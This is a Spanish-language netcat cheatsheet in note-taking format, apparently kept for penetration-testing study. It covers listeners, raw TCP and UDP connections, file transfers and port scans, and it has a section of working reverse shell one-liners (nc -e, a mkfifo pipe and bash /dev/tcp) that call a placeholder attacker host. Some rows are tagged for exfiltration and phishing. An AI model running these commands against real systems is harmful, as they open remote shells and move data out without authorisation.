---
aliases:
  - netcat
tags:
  - estado/completo
  - tool/netcat
kind: Tool
linked:
  - "[[ncat]]"
  - "[[Reverse Shell]]"
---
# nc

> [!info]
> Swiss army knife de TCP/UDP. Listener, conexiones raw, transferencia archivos, reverse/bind shells. Versiones: `nc.traditional`, `nc.openbsd`, `ncat` (extendido).

***

## Cheatsheet

| Comando | Qué obtenés | Cuándo |
|---|---|---|
| `nc -lvnp 4444` | Listener TCP | Recibir reverse shell |
| `nc <target> <port>` | Conectar TCP raw | Banner grab, testing |
| `nc -u <target> 53` | Conectar UDP | UDP testing (DNS, SNMP) |
| `nc -lvnp 4444 > file.bin` | Recibir archivo | Exfil simple |
| `nc <target> 4444 < file.bin` | Enviar archivo | Push file |
| `nc -e /bin/sh <attacker> 4444` | Reverse shell (versión `-e`) | Si nc traditional |
| `nc -lvnp 80 < response.txt` | Servir HTTP response estático | Phishing/PoC |

***

## Reverse shells

```bash
# Attacker
nc -lvnp 4444

# Target (traditional)
nc -e /bin/bash <attacker> 4444

# Target (sin -e, alternativa)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <attacker> 4444 > /tmp/f

# Bash builtin (sin nc)
bash -i >& /dev/tcp/<attacker>/4444 0>&1
```

Ver [[Reverse Shell]].

***

## Port scan

```bash
nc -zv <target> 1-1000  # TCP scan rápido (no flexible, usar nmap)
nc -zuv <target> 53     # UDP probe
```

***

## Notas Relacionadas

- [[ncat]]
- [[Reverse Shell]]
- [[File Transfers]]
